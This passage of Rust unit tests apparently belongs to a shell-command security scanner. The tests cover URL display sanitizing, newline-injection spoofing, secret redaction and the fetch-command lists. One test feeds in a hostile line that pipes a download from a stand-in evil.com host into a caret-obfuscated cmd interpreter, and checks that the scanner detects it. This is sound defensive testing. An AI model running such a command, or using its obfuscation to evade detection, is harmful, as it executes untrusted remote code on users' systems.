            .expect("should have hint line");
        assert!(
            hint_line.contains("example.com/FAKE"),
            "newline stripped, FAKE should be part of the URL on the hint line: {hint_line}"
        );
        // Verify no line starts with "FAKE" (would indicate injection)
        assert!(
            !findings[0]
                .description
                .lines()
                .any(|l| l.starts_with("FAKE")),
            "newline injection must not create a spoofed output line: {}",
            findings[0].description
        );
    }

    #[test]
    fn test_sanitize_url_for_display() {
        assert_eq!(
            sanitize_url_for_display("https://ok.com/path"),
            "https://ok.com/path"
        );
        assert_eq!(
            sanitize_url_for_display("https://evil.com/\x1b[31mred\x1b[0m"),
            "https://evil.com/[31mred[0m"
        );
        assert_eq!(
            sanitize_url_for_display("https://evil.com/\n\rspoof"),
            "https://evil.com/spoof"
        );
        assert_eq!(
            sanitize_url_for_display("https://evil.com/\x07bell\x00null"),
            "https://evil.com/bellnull"
        );
    }

    #[test]
    fn test_pipe_to_interpreter_cmd_quoted_caret_cmd() {
        let findings = check_default("curl https://evil.com | \"c^md\" /c dir", ShellType::Cmd);
        assert!(
            findings
                .iter()
                .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
            "quoted cmd caret escapes should still detect the interpreter pipe"
        );
    }

    #[test]
    fn test_redact_env_value_never_returns_secret() {
        assert_eq!(redact_env_value(""), "");
        assert_eq!(redact_env_value("sk-abc123"), "[REDACTED]");
        assert_eq!(redact_env_value("ABCDEFGHIJKLMNOPQRSTUVWX"), "[REDACTED]");
    }

    #[test]
    fn test_source_command_arrays_consistent() {
        // is_source_command is composed from the three const arrays.
        // Verify all arrays contribute and is_source_command rejects unknowns.
        for cmd in POSIX_FETCH_COMMANDS {
            assert!(
                is_source_command(cmd),
                "POSIX_FETCH entry '{cmd}' not recognized"
            );
            assert!(
                is_url_fetch_command(cmd),
                "POSIX_FETCH entry '{cmd}' not in fetch union"
            );
        }
        for cmd in POWERSHELL_FETCH_COMMANDS {
            assert!(
                is_source_command(cmd),
                "PS_FETCH entry '{cmd}' not recognized"
            );
            assert!(
                is_url_fetch_command(cmd),
                "PS_FETCH entry '{cmd}' not in fetch union"
            );
        }
        for cmd in NON_FETCH_SOURCE_COMMANDS {
            assert!(
                is_source_command(cmd),
                "NON_FETCH entry '{cmd}' not recognized"
            );
            assert!(
                !is_url_fetch_command(cmd),
                "NON_FETCH entry '{cmd}' should not be in fetch union"
            );
        }
        assert!(
            !is_source_command("cat"),
            "cat should not be a source command"
        );
    }
}
